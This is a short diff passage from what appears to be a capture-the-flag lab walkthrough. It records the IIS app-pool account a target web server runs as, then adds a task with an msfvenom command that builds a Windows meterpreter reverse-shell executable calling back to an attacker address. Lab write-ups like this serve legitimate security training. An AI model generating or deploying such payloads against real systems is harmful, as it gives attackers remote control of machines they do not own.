@@ -337,3 +337,10 @@ From the exploit itself basic instruction:
 ## Q3 Who is the webserver running as?
 Answer:iis apppool\blog
 
+## Task 4
+
+Here a more stable reverse shell is the goal that from the exploit so a msfvenom payload is required for a windows system:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
+
+
